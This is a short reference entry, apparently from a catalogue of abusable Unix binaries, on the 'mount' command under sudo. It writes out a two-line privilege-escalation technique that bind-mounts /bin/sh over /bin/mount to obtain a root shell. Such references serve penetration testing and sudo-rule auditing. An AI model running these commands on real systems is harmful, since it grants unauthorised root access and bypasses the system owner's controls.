***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * Exploit the fact that mount can be executed via sudo to replace the mount
      binary with a shell.
      sudo mount -o bind /bin/sh /bin/mount
      sudo mount
